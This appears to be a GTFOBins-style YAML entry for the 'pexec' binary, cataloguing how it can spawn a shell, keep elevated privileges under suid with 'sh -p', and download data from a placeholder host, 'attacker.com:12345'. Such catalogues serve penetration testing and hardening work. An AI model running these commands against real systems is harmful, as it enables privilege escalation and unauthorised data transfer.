---
functions:
  shell:
  - code: |-
      pexec /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          pexec /bin/sh -p
        shell: false
      unprivileged:
  download:
  - code: |-
      pexec --remote --connect attacker.com:12345 > /path/to/output-file
    binary: false
    contexts:
      unprivileged:
    comment:
      Downloads one line after sending a command.
    sender: tcp-server      
...
